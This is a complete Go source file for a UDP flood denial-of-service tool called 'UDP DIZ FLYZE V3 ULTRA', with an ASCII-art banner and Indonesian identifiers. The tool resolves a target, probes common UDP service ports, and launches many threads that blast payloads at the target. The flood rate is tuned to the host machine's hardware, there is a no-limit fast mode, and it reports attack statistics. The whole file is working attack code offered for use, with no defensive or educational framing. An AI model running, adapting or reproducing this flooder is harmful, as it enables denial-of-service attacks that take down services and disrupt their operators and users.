package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	LINK      string
	RATE      int32
	duration  int
	THREAD    int
	SIZE      int
	VERSI     bool
	BANDWIT   int
	b     bool
	DYNAMIC   bool
	floodRunning atomic.Bool
	KIRIM     atomic.Uint64
	GAGAL     atomic.Uint64
	openPorts []int
)

const (
	version = "UDP DIZ FLYZE V3 ULTRA"
	ST      = 2 * time.Second
	BC      = 3 * time.Second
)

func init() {
	flag.StringVar(&LINK, "target", "", "LINK TARGET")
	flag.IntVar(&duration, "duration", 0, "TIME")
	flag.IntVar(&THREAD, "threads", 0, "THREAD")
	flag.IntVar(&SIZE, "size", 0, "UKURAN")
	flag.BoolVar(&VERSI, "version", false, "VERSION")
	flag.IntVar(&BANDWIT, "maxbw", 0, "MBPS")
	flag.BoolVar(&b, "b", false, "FAST MODE")
	flag.BoolVar(&DYNAMIC, "dynamic", false, "DYNAMIC PAYLOAD")
}

func main() {
	printBanner()
	flag.Parse()

	if VERSI {
		fmt.Println(version)
		os.Exit(0)
	}

	if LINK == "" {
		LINK = Logo()
	}

	IPT, err := RIP(LINK)
	if err != nil {
		fmt.Printf("\nIP Gagal di kompres : %v\n", err)
		os.Exit(1)
	}

	Config()
	CekPort(IPT)
	if len(openPorts) == 0 {
		openPorts = []int{53, 80, 8080, 123, 443, 1900, 5353}
	}

	fmt.Printf("\n💉 LINK : %s\n", LINK)
	fmt.Printf("💉 IP : %s\n", IPT)
	fmt.Printf("💉 PORT : %v\n", openPorts)
	fmt.Printf("💉 PAYL : %d \n", SIZE)
	fmt.Printf("💉 THRD : %d\n", THREAD)
	fmt.Printf("💉 RATE : %d \n", atomic.LoadInt32(&RATE))
	fmt.Printf("💉 TIME : %d \n", duration)
	fmt.Printf("💉 MBPS : %d \n\n", BANDWIT)

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	floodRunning.Store(true)
	go Status()

	if BANDWIT > 0 {
		go Bndwit()
	}

	for i := 0; i < THREAD; i++ {
		go Worker(IPT)
	}

	if duration > 0 {
		time.AfterFunc(time.Duration(duration)*time.Second, func() {
			floodRunning.Store(false)
		})
	}

	<-sigChan
	floodRunning.Store(false)
	time.Sleep(500 * time.Millisecond)
	fmt.Println("\n[!] Attack stopped")
}

func Logo() string {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠂⣠⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠞⠽⠿⠟⠻⠿⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠒⠋⠉⠁⠀⠀⠀⠀⠀⠀⠈⠙⠓⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⢀⣀⣀⡀⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠙⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⢠⠞⠉⠀⠀⠈⠙⢦⣴⠟⠉⠀⠀⠀⠙⣧⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⡤⠶⢤⣼⡟⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⢀⣀⣀⠀⢸⡆⢸⣷⣤⣴⣦⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⡏⣰⠿⠦⣌⣻⠀⢸⡇⣾⣻⡿⣷⠀⠀⠀⠀⠀⢀⣿⣯⣽⣷⣸⡇⠀⣿⣡⠾⠛⢷⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢿⡆⣿⡀⢾⡟⠁⢀⣸⣿⣷⡿⢿⣿⠀⣠⡤⠤⣄⠘⣿⣿⣹⣿⣿⣧⡀⠙⠓⣶⣤⣾⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠻⣞⢷⡾⠁⣰⠟⠉⠉⠿⣷⣿⠟⢺⣥⣤⣤⣼⡆⠙⠻⠿⠟⠀⠉⢻⡆⣤⣿⡞⣣⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⣿⡷⣇⠀⠀⠀⠀⣀⠀⠀⠀⠈⠉⠉⠀⠀⢀⣀⠀⠀⠀⠀⣸⡇⣼⡿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⢷⡹⣄⠀⠀⠀⢻⡝⠓⠲⠤⣤⣤⠴⠚⢋⡿⠃⠀⠀⣠⡟⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠳⣝⣦⣀⠀⠀⠙⢶⣞⠉⠙⠋⠉⣹⡟⠁⢀⣠⣴⣿⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠛⠛⠻⠦⠴⣦⣌⠙⠒⠛⣋⣽⠷⠞⠋⠉⠀⠀⠹⣦⠀⠀⠀⠀⠀⠀⠀⠀⢸⠋⠀⠀⠀⠹⡆
⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⡷
⠀⠀⠀⠀⠀⢀⣾⠁⠀⠀⠀⠀⢠⡀⣠⡶⠖⠒⠒⠒⠲⠦⣀⠀⠰⣤⠀⠀⠀⠀⠀⢳⡄⠀⠀⠀⠀⠀⢠⡿⠀⠀⠀⣴⠇
⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⡿⢰⠏⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⢸⣧⠀⠀⠀⠀⠀⢻⡀⠀⠀⢀⣴⠟⠁⠀⢀⣼⠋⠀
⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⢰⠇⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⣸⠋⣧⠀⠀⠀⠀⠸⣇⣠⡶⠋⠁⠀⠀⣠⡾⠁⠀⠀
⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⡀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠇⠀⣹⡄⠀⠀⠀⠀⣿⠁⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠛⠛⢯⡇⠀⠀⠀⠀⣿⣧⠤⠞⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⡀⠈⠛⠲⣦⡤⠤⠤⢶⣞⠋⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⣷⣠⠴⠛⠋⠳⣦⣀⣀⣈⡿⠦⣄⣀⢀⣿⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡇⠀⠀⠀⢰⡖⠒⣿⡙⢧⡀⠀⠀⠀⠈⠉⠁⢀⡴⠋⢉⣿⠿⣤⡄⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⢶⠚⣿⢷⠟⢿⡟⠾⠃⠀⠘⢷⣌⣻⡄⠀⠀⠀⠀⢠⣟⣁⣠⠞⠁⠀⢸⣧⠴⢻⣾⢿⡷⠴⢤⡄⠀⠀⠀⠀⠀⠀⠀
⢸⣟⣭⢽⡏⠀⠀⠀⠀⠀⠀⢀⠀⠘⣿⠉⣿⠀⠀⠀⠀⣿⠋⢹⠋⢠⡄⠀⠀⠀⠀⠈⠁⢸⡿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠘⢾⡇⠸⣇⠀⢠⡄⠰⣄⠀⠘⣿⡶⡯⠴⠋⠀⠀⠀⠀⠻⢧⣬⣷⣿⠃⠀⣴⠀⠀⣦⢀⣾⠃⠈⣿⠆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠙⠋⠉⠓⠚⠳⠶⠛⠷⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠶⠶⠿⠒⠚⠛⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
` + version + `
⼳ : `)
	input, _ := reader.ReadString('\n')
	return strings.TrimSpace(input)
}

func printBanner() {
	fmt.Print("\033[H\033[2J")
}

func RIP(target string) (string, error) {
	if strings.Contains(target, "://") {
		u, err := url.Parse(target)
		if err != nil {
			return "", err
		}
		target = u.Hostname()
	}

	if ip := net.ParseIP(target); ip != nil {
		return target, nil
	}

	ips, err := net.LookupIP(target)
	if err != nil {
		return "", err
	}

	for _, ip := range ips {
		if ipv4 := ip.To4(); ipv4 != nil {
			return ipv4.String(), nil
		}
	}
	
	if len(ips) > 0 {
		return ips[0].String(), nil
	}
	
	return "", fmt.Errorf("no IP found")
}

func Config() {
	numCPU := runtime.NumCPU()
	memStats := &runtime.MemStats{}
	runtime.ReadMemStats(memStats)
	totalMemMB := int(memStats.Sys / (1024 * 1024))

	fmt.Printf("\nCPU : %d CORES\nRAM : %d MB\n", numCPU, totalMemMB)

	if THREAD == 0 {
		switch {
		case totalMemMB < 1024:
			THREAD = numCPU * 2
		case totalMemMB < 4096:
			THREAD = numCPU * 4
		default:
			THREAD = numCPU * 8
		}
	}

	if SIZE == 0 {
		switch {
		case totalMemMB < 1024:
			SIZE = 128
		case totalMemMB < 2048:
			SIZE = 256
		case totalMemMB < 4096:
			SIZE = 512
		default:
			SIZE = 1024
		}
	}

	baseRate := 5000
	switch {
	case numCPU >= 8 && totalMemMB >= 4096:
		baseRate = 30000
	case numCPU >= 4 && totalMemMB >= 2048:
		baseRate = 15000
	}

	rate := baseRate * THREAD
	if BANDWIT > 0 {
		maxRate := (BANDWIT * 1000000) / (SIZE * 8)
		if rate > maxRate {
			rate = maxRate
		}
	}
	atomic.StoreInt32(&RATE, int32(rate))
}

func CekPort(IPT string) {
	commonPorts := []int{53, 67, 68, 69, 80, 8080, 123, 137, 138, 161, 500, 514, 520, 1900, 4500, 5353, 11211}
	results := make(chan int, len(commonPorts))
	activePorts := 0

	portChecker := func(port int) {
		target := fmt.Sprintf("%s:%d", IPT, port)
		conn, err := net.DialTimeout("udp", target, ST)
		if err == nil {
			conn.Close()
			results <- port
		} else {
			results <- 0
		}
	}

	for _, port := range commonPorts {
		go portChecker(port)
	}

	for i := 0; i < len(commonPorts); i++ {
		port := <-results
		if port != 0 {
			openPorts = append(openPorts, port)
			activePorts++
			if activePorts >= 3 {
				break
			}
		}
	}
}

func Worker(IPT string) {
	conn, err := net.ListenPacket("udp", ":0")
	if err != nil {
		fmt.Printf("Error creating socket: %v\n", err)
		return
	}
	defer conn.Close()

	rand.Seed(time.Now().UnixNano())
	portsCount := len(openPorts)
	
	for floodRunning.Load() {
		start := time.Now()
		sent := 0
		rate := int(atomic.LoadInt32(&RATE))

		for (sent < rate/THREAD) || b {
			if portsCount == 0 {
				continue
			}

			payload := make([]byte, SIZE)
			if DYNAMIC {
				rand.Read(payload)
			}

			port := openPorts[rand.Intn(portsCount)]
			addr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", IPT, port))
			if err != nil {
				GAGAL.Add(1)
				continue
			}

			_, err = conn.WriteTo(payload, addr)
			if err != nil {
				GAGAL.Add(1)
				continue
			}

			KIRIM.Add(1)
			sent++

			if !floodRunning.Load() {
				return
			}
		}

		elapsed := time.Since(start)
		if elapsed < time.Second {
			time.Sleep(time.Second - elapsed)
		}
	}
}

func Bndwit() {
	const threshold = 0.85
	lastTotal := KIRIM.Load()
	lastTime := time.Now()

	for floodRunning.Load() {
		time.Sleep(BC)
		
		currentTotal := KIRIM.Load()
		now := time.Now()
		elapsed := now.Sub(lastTime).Seconds()
		lastTime = now

		currentBW := float64(currentTotal-lastTotal) * float64(SIZE) * 8 / 1000000 / elapsed
		lastTotal = currentTotal

		currentRate := atomic.LoadInt32(&RATE)
		newRate := currentRate

		if currentBW > float64(BANDWIT)*threshold {
			newRate = int32(float64(currentRate) * 0.85)
		} else if currentBW < float64(BANDWIT)*(threshold-0.1) {
			newRate = int32(float64(currentRate) * 1.1)
		}

		if newRate != currentRate {
			atomic.StoreInt32(&RATE, newRate)
		}
	}
}

func Status() {
	start := time.Now()
	var lastSent uint64
	lastTime := start

	for floodRunning.Load() {
		time.Sleep(1 * time.Second)
		current := KIRIM.Load()
		now := time.Now()
		elapsed := now.Sub(lastTime).Seconds()
		PPS := float64(current-lastSent) / elapsed
		TTE := now.Sub(start).Seconds()
		bytesSent := float64(current * uint64(SIZE))
		BANDWIDTH := (bytesSent * 8 / 1000000) / TTE
		
		fmt.Printf("\r🚀%d 🎁%.0f 📤%.2f 🧭%.0fs", 
			current, PPS, BANDWIDTH, TTE)
		
		lastSent = current
		lastTime = now
	}

	TTE := time.Since(start).Seconds()
	total := KIRIM.Load()
	PPS := float64(total) / TTE
	bytesSent := float64(total * uint64(SIZE))
	BANDWIDTH := (bytesSent * 8 / 1000000) / TTE

	fmt.Printf("\n\n[+] Attack finished")
	fmt.Printf("\nTotal packets: %d", total)
	fmt.Printf("\nFailed packets: %d", GAGAL.Load())
	fmt.Printf("\nAverage PPS: %.0f", PPS)
	fmt.Printf("\nAverage bandwidth: %.2f Mbps", BANDWIDTH)
	fmt.Printf("\nDuration: %.2f seconds\n", TTE)
}
